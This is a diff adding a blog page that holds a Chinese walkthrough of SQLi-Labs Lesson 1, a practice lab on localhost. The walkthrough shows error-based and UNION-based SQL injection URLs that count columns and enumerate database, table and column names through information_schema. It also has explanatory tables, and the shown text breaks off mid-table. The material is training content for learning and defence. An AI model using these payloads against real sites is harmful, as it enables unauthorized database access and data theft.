@@ -1,0 +1,1236 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="R4x">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="R4x">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="道阻且长，行则将至">
+    <meta name="description" content="Lesson 1GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入提示用参数名为id，值为数字，尝试一下： 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 显示了用户名和密码，测试后发现共有14条数据。 【1】查列数1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&amp;#x27; order by 3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi-Labs靶场刷题记录【Basic Challenges】">
+<meta property="og:url" content="http://example.com/2022/11/10/SQLi-Labs%20Basic%20Challenges/index.html">
+<meta property="og:site_name" content="R4x&#39;s Blog">
+<meta property="og:description" content="Lesson 1GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入提示用参数名为id，值为数字，尝试一下： 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 显示了用户名和密码，测试后发现共有14条数据。 【1】查列数1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&amp;#x27; order by 3">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191555650.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191556912.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191718587.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191722742.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191723859.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191725808.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191820579.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191837919.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191841804.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191842038.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191844993.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191847592.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191848031.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191849741.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210192020350.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210192023276.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210192024117.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210192026667.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201053028.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201054955.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201056774.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201058865.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201104209.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201103270.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201105107.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201106974.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201221589.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201222509.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201224775.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201651415.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201813023.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201816115.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201826829.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201820957.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201821976.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201923610.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211035600.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211039770.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211107917.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211648824.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211649467.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211735412.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211736643.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211801750.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211801260.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221133855.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221136669.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221136133.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221509557.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221506907.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221515469.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221523318.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221534256.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221536572.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221539805.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221540428.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221543645.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221544030.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221619153.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221620720.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221626113.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221627265.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221629192.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221629330.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221632785.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221651811.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221652256.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221654221.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221721247.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221725996.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221725819.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221725819.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221745186.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221803416.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210222048980.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231246292.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231248879.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231247390.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231250979.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231251132.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231548234.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231939060.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231940816.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231941038.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231943433.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231943010.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231946122.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231954343.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231956575.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231957263.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231958296.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210231958821.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210232001476.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210232001738.png">
+<meta property="article:published_time" content="2022-11-10T15:47:05.141Z">
+<meta property="article:modified_time" content="2022-11-10T15:52:26.803Z">
+<meta property="article:author" content="R4x">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191555650.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>SQLi-Labs靶场刷题记录【Basic Challenges】 · R4x&#39;s Blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>R4x's Blog.</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">R4x&#39;s Blog.</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">SQLi-Labs靶场刷题记录【Basic Challenges】</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                SQLi-Labs靶场刷题记录【Basic Challenges】
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">6.9k</span>Reading time: <span class="post-count reading-time">33 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/11/10</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+         <meta name="referrer" content="no-referrer" />
+
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191555650.png"></p>
+<h1 id="Lesson-1"><a href="#Lesson-1" class="headerlink" title="Lesson 1"></a>Lesson 1</h1><p><strong>GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191556912.png"><br>提示用参数名为<code>id</code>，值为数字，尝试一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191718587.png"><br>显示了用户名和密码，测试后发现共有14条数据。</p>
+<h2 id="【1】查列数"><a href="#【1】查列数" class="headerlink" title="【1】查列数"></a>【1】查列数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191722742.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191723859.png"><br>到第四列时报错，共有三列数据</p>
+<h2 id="【2】查库名"><a href="#【2】查库名" class="headerlink" title="【2】查库名"></a>【2】查库名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 3,database(),database(); --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191725808.png"><br>要注意的两个点：</p>
+<ul>
+<li>id必须为-1，或任何表中不存在的id，因为如果存在的话，name和password处就会显示该表中该id对应的数据，后面联合查询到的数据不会被显示出来</li>
+<li>联合查询会将查出来的数据与原来查询出的数据并列，所以联合查询的条数要等于原表中的列数，否则会报错，这里查询出来大约是如下的样子：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----+--------------+---------------------------+</span><br><span class="line">| id | name         | url                       | </span><br><span class="line">+----+--------------+---------------------------+</span><br><span class="line">| -1 |              |                           |</span><br><span class="line">| 3  |  security    | security                  |</span><br><span class="line">+----+--------------+---------------------------+</span><br></pre></td></tr></table></figure>
+<h2 id="【3】获取所有表"><a href="#【3】获取所有表" class="headerlink" title="【3】获取所有表"></a>【3】获取所有表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+<img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191820579.png"></li>
+<li><code>GROUP_CONCAT()</code>：将group by产生的同一个分组中的值连接起来，返回一个字符串结果</li>
+<li><code>information_schema.tables</code>各字段说明：<table>
+<thead>
+<tr>
+<th><strong>字段</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Table_catalog</td>
+<td>数据表登记目录</td>
+</tr>
+<tr>
+<td>Table_schema</td>
+<td>数据表所属的数据库名</td>
+</tr>
+<tr>
+<td>Table_name</td>
+<td>表名称</td>
+</tr>
+<tr>
+<td>Table_type</td>
+<td>表类型[system view|base table]</td>
+</tr>
+<tr>
+<td>Engine</td>
+<td>使用的数据库引擎[MyISAM|CSV|InnoDB]</td>
+</tr>
+<tr>
+<td>Version</td>
+<td>版本，默认值10</td>
+</tr>
+<tr>
+<td>Row_format</td>
+<td>行格式[Compact|Dynamic|Fixed]</td>
+</tr>
+<tr>
+<td>Table_rows</td>
+<td>表里所存多少行数据</td>
+</tr>
+<tr>
+<td>Avg_row_length</td>
+<td>平均行长度</td>
+</tr>
+<tr>
+<td>Data_length</td>
+<td>数据长度</td>
+</tr>
+<tr>
+<td>Max_data_length</td>
+<td>最大数据长度</td>
+</tr>
+<tr>
+<td>Index_length</td>
+<td>索引长度</td>
+</tr>
+<tr>
+<td>Data_free</td>
+<td>空间碎片</td>
+</tr>
+<tr>
+<td>Auto_increment</td>
+<td>做自增主键的自动增量当前值</td>
+</tr>
+<tr>
+<td>Create_time</td>
+<td>表的创建时间</td>
+</tr>
+<tr>
+<td>Update_time</td>
+<td>表的更新时间</td>
+</tr>
+<tr>
+<td>Check_time</td>
+<td>表的检查时间</td>
+</tr>
+<tr>
+<td>Table_collation</td>
+<td>表的字符校验编码集</td>
+</tr>
+<tr>
+<td>Checksum</td>
+<td>校验和</td>
+</tr>
+<tr>
+<td>Create_options</td>
+<td>创建选项</td>
+</tr>
+<tr>
+<td>Table_comment</td>
+<td>表的注释、备注</td>
+</tr>
+</tbody></table>
+<h2 id="【4】查询字段"><a href="#【4】查询字段" class="headerlink" title="【4】查询字段"></a>【4】查询字段</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+<img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191837919.png"></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>字段</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>table_schema&nbsp;</td>
+<td>表所有者（对于schema的名称）</td>
+</tr>
+<tr>
+<td>table_name&nbsp;</td>
+<td>表名</td>
+</tr>
+<tr>
+<td>column_name&nbsp;</td>
+<td>列名</td>
+</tr>
+<tr>
+<td>ordinal_position&nbsp;</td>
+<td>列标识号</td>
+</tr>
+<tr>
+<td>column_default&nbsp;</td>
+<td>列的默认值</td>
+</tr>
+<tr>
+<td>is_nullable&nbsp;</td>
+<td>列的为空性。如果列允许 null，那么该列返回 yes。否则，返回 no</td>
+</tr>
+<tr>
+<td>data_type&nbsp;</td>
+<td>系统提供的数据类型</td>
+</tr>
+<tr>
+<td>character_maximum_length</td>
+<td>以字符为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 null。有关更多信息，请参见数据类型</td>
+</tr>
+<tr>
+<td>character_octet_length&nbsp;</td>
